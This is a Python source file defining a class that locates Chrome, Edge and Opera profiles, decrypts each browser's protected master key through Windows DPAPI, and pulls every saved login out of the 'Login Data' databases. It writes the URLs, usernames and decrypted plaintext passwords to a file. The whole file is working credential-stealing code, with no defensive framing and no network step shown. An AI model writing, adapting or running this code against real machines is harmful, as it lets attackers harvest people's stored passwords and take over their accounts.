import os
import json
import base64
import sqlite3
import win32crypt
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import shutil

class extract:
    def __init__(self, file_path):
        appdata = os.getenv("APPDATA")
        local_appdata = os.getenv("LOCALAPPDATA")

        def check_file(path, is_file=None):
            try:
                if is_file:
                    return os.path.isfile(path)
                return os.path.exists(path)
            except Exception as e:
                print(f"[!] Error checking file: {e}")
                return False

        def find_profiles(local_state):
            profiles = []
            try:
                with open(local_state, "r", encoding="utf-8") as f:
                    json_content = json.load(f)
                    for key in json_content["profile"]["info_cache"].keys():
                        profiles.append(key)
            except KeyError:
                print(f"[-] KeyError in local_state: {local_state}")
            except FileNotFoundError:
                print(f"[-] Local State file not found at: {local_state}")
            except Exception as e:
                print(f"[-] Unexpected error reading profiles: {e}")
            return profiles

        if not appdata:
            print("[+] APPDATA environment variable not found, constructing path manually.")
            appdata = os.path.join(os.path.expanduser("~"), "AppData", "Roaming")
            if not os.path.exists(appdata):
                print("[-] AppData directory doesn't exist, aborting.")
                return
            else:
                print(f"[+] APPDATA path constructed: {appdata}")
        self.appdata = appdata

        if not local_appdata:
            print("[+] LOCALAPPDATA environment variable not found, constructing path manually.")
            local_appdata = os.path.join(os.path.expanduser("~"), "AppData", "Local")
            if not os.path.exists(local_appdata):
                print("[-] Local AppData directory doesn't exist, aborting.")
                return
            else:
                print(f"[+] LOCALAPPDATA path constructed: {local_appdata}")
        self.local_appdata = local_appdata

        class Browser:
            def __init__(self, name, base_path):
                self.name = name
                self.base_path = base_path
                self.local_state_path = os.path.join(base_path, "Local State")
                self.profiles = find_profiles(self.local_state_path) if check_file(self.base_path) else []

            def exists(self):
                return check_file(self.base_path) and check_file(self.local_state_path)

        browser_list = [
            Browser("Chrome", os.path.join(local_appdata, "Google", "Chrome", "User Data")),
            Browser("Edge", os.path.join(local_appdata, "Microsoft", "Edge", "User Data")),
            Browser("Opera", os.path.join(appdata, "Opera Software", "Opera Stable")),
            Browser("Opera GX", os.path.join(appdata, "Opera Software", "Opera GX Stable")),
        ]

        installed_browsers = [b for b in browser_list if b.exists()]
        print(f"[+] Found {len(installed_browsers)} installed browser(s).")

        try:
            with open(file_path, "w", encoding="utf-8") as outfile: # Open in write mode to clear previous content
                outfile.write("-------------------- Browser Passwords --------------------\n\n")

                for browser in installed_browsers:
                    outfile.write(f"==================== {browser.name} ====================\n")
                    print(f"[+] Processing browser: {browser.name}")
                    try:
                        with open(browser.local_state_path, "r", encoding="utf-8") as f:
                            json_content = json.load(f)
                            try:
                                encrypted_key = base64.b64decode(json_content["os_crypt"]["encrypted_key"])[5:]
                                key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                                print(f"[+] Successfully extracted encryption key for {browser.name}.")
                            except KeyError:
                                print(f"[!] 'os_crypt' or 'encrypted_key' not found in Local State for {browser.name}.")
                                continue
                            except Exception as e:
                                print(f"[!] Error extracting encryption key for {browser.name}: {e}")
                                continue

                        print(f"[+] Found {len(browser.profiles)} profile(s) for {browser.name}.")
                        for profile in browser.profiles:
                            outfile.write(f"\n----- Profile: {profile} -----\n")
                            print(f"[+] Processing profile: {profile}")
                            profile_path = browser.base_path if profile in ["Opera GX Stable", "Opera Stable"] else os.path.join(browser.base_path, profile)
                            try:
                                login_data = os.path.join(profile_path, "Login Data")
                                temp_db = os.path.join(browser.base_path, "tempdb.db")
                                print(f"[+] Copying Login Data database for profile: {profile}")
                                try:
                                    shutil.copy(login_data, temp_db)
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    cursor.execute("SELECT password_value, username_value, origin_url FROM logins")
                                    rows = cursor.fetchall()
                                    print(f"[+] Retrieved {len(rows)} password entries from Login Data for profile: {profile}")

                                    if rows:
                                        for enc_pass, user, url in rows:
                                            try:
                                                if not enc_pass:
                                                    continue

                                                enc_pass = enc_pass[3:]
                                                iv, payload, tag = enc_pass[:12], enc_pass[12:-16], enc_pass[-16:]
                                                cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
                                                decryptor = cipher.decryptor()
                                                decrypted_pass = decryptor.update(payload) + decryptor.finalize()

                                                outfile.write(f"URL: {url}\n")
                                                outfile.write(f"Username: {user}\n")
                                                outfile.write(f"Password: {decrypted_pass.decode('utf-8')}\n")
                                                outfile.write("---\n")
                                                print(f"[+] Decrypted password for URL: {url}")
                                            except Exception as e:
                                                outfile.write(f"[!] Error decrypting password for {url}: {e}\n")
                                                print(f"[!] Error decrypting password for URL: {url}: {e}")
                                    else:
                                        outfile.write("No passwords found in this profile.\n")
                                        print(f"[+] No passwords found in profile: {profile}")

                                    conn.close()
                                finally:
                                    if os.path.exists(temp_db):
                                        os.remove(temp_db)
                                        print(f"[+] Removed temporary database: {temp_db}")

                            except sqlite3.OperationalError as e:
                                outfile.write(f"[!] SQLite error accessing Login Data for {profile}: {e}\n")
                                print(f"[!] SQLite error accessing Login Data for profile {profile}: {e}")
                            except FileNotFoundError:
                                outfile.write(f"[!] Login Data file not found for profile: {profile}\n")
                                print(f"[!] Login Data file not found for profile: {profile}")
                            except Exception as e:
                                outfile.write(f"[!] Error accessing login data for profile {profile}: {e}\n")
                                print(f"[!] Error accessing login data for profile {profile}: {e}")
                    except Exception as e:
                        outfile.write(f"[!] Error processing {browser.name}: {e}\n")
                        print(f"[!] Error processing browser {browser.name}: {e}")
                    outfile.write("\n") # Add a newline after each browser

                outfile.write("\n-------------------- End of Passwords --------------------\n")
            print(f"[+] Finished extracting passwords and saved to: {file_path}")

        except Exception as e:
            print(f"[!] Critical error: {e}")